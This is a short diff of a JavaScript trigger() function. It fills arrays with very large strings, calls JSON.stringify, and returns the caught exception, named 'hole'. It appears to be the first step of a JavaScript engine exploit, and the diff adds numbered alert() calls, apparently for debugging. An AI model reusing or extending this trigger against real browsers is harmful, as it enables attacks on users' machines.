@@ -4,16 +4,20 @@
       function trigger() {
         let a = [], b = [];
         let s = '"'.repeat(0x800000);
+        alert(1);
         a[20000] = s;
+        alert(2);
         for (let i = 0; i < 10; i++) a[i] = s;
+        alert(3);
         for (let i = 0; i < 10; i++) b[i] = a;
-
+        alert(4);
         try {
           JSON.stringify(b);
+          alert(5);
         } catch (hole) {
+          alert(6);
           return hole;
         }
-        alert("Error, could not trigger");
         throw new Error('could not trigger');
       }
 
